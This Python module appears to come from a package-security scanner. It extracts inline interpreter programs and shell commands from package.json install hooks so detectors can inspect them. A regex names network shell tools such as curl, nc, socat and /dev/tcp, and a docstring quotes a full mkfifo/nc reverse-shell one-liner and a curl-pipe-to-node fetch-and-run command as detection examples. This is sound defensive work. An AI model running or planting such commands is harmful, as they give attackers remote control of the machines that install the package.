"""Programs an install hook carries inline: `node -e "..."`, `python -c "..."`.

A hook that runs `node scripts/postinstall.js` is graded by what that file does, because the
file is in the scan and every content detector reads it as install-time code. A hook that runs
`node -e "<program>"` carries the same kind of program in the manifest itself, and only a word
list looked at it: the content detectors never did. The engine lifts each such program out as a
unit of its own -- `package/package.json#postinstall-0.js` -- so it is read exactly as a hook's
file is, and the manifest grades the hook the way it grades one that runs a file it can read.
"""

from __future__ import annotations

import re
from typing import NamedTuple

#: Interpreter -> (the flags that take a program, the suffix its language is read by).
_INTERPRETERS: dict[str, tuple[tuple[str, ...], str]] = {
    "node": (("-e", "--eval", "-p", "--print"), ".js"),
    "nodejs": (("-e", "--eval", "-p", "--print"), ".js"),
    "python": (("-c",), ".py"),
    "python3": (("-c",), ".py"),
    "ruby": (("-e",), ".rb"),
    "perl": (("-e",), ".pl"),
    "php": (("-r",), ".php"),
}

INLINE_PROGRAM = re.compile(
    r"(?:^|(?<=[\s;&|(]))(?P<interpreter>nodejs|node|python3|python|ruby|perl|php)"
    r"[ \t]{1,4}(?P<flag>--eval|--print|-[ecpr])[ \t]{1,4}"
    r"(?:'(?P<single>[^']{1,4000})'|\"(?P<double>[^\"]{1,4000})\")"
)
"""An interpreter given its program on the command line, in single or double quotes.

Bounded at every repeat. A command reaches here decoded from the manifest's JSON, so an inner
quote is a literal one and a quoted program ends at the first matching quote."""


SHELL_WORK = re.compile(
    r"\b(?:curl|wget|nc|ncat|netcat|socat|telnet|mkfifo|base64|openssl|eval|powershell|pwsh|"
    r"iwr|Invoke-WebRequest|Invoke-Expression|iex)\b|/dev/(?:tcp|udp)/|\|"
)
"""A hook command doing shell work of its own: fetching, opening a socket, decoding, evaluating,
or piping one program into another. A command that only names a build tool or a file does not."""


class InlineProgram(NamedTuple):
    path: str
    """Where the program is read: the manifest's path, `#`, the hook, its index, a suffix."""
    source: str
    span: tuple[int, int]
    """The whole `node -e "..."` clause within the command."""
    interpreter: str


class InlinePrograms:
    """Lifting a hook's inline programs out, and reading the command as running them."""

    @staticmethod
    def found(manifest_path: str, hook_name: str, command: str) -> list[InlineProgram]:
        """Each program the command hands an interpreter inline, in order."""
        found: list[InlineProgram] = []
        for match in INLINE_PROGRAM.finditer(command):
            interpreter = match.group("interpreter")
            flags, suffix = _INTERPRETERS[interpreter]
            if match.group("flag") not in flags:
                continue
            source = match.group("single") or match.group("double") or ""
            found.append(
                InlineProgram(
                    path=f"{manifest_path}#{hook_name}-{len(found)}{suffix}",
                    source=source,
                    span=match.span(),
                    interpreter=interpreter,
                )
            )
        return found

    @staticmethod
    def shell(manifest_path: str, hook_name: str, command: str) -> InlineProgram | None:
        """The hook's command itself, as the shell program it is, when it does shell work.

        `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <host> <port> >/tmp/f` and
        `curl -s <url> | node --input-type=module` are whole programs written in the manifest;
        a word list read them and the shell rules never did (review 98: both only raised
        "has an install script"). Lifted as `package.json#postinstall.sh`, every content detector
        reads them as install-time shell, as it reads a hook's `.sh` file.
        """
        if not command or not SHELL_WORK.search(command):
            return None
        return InlineProgram(
            path=f"{manifest_path}#{hook_name}.sh",
            source=command,
            span=(0, len(command)),
            interpreter="sh",
        )

    @staticmethod
    def lifted(manifest_path: str, hook_name: str, command: str) -> list[InlineProgram]:
        """Everything a hook's command is lifted into: its inline programs, and the command."""
        whole = InlinePrograms.shell(manifest_path, hook_name, command)
        return [
            *InlinePrograms.found(manifest_path, hook_name, command),
            *([whole] if whole else []),
        ]

    @staticmethod
    def as_file_command(command: str, programs: list[InlineProgram]) -> str:
        """The command with each inline program replaced by the file it was lifted into:
        `node -e "..." && x` reads as `node package.json#postinstall-0.js && x`."""
        for program in reversed(programs):
            start, end = program.span
            name = program.path.rpartition("/")[2]
            command = f"{command[:start]}{program.interpreter} {name}{command[end:]}"
        return command
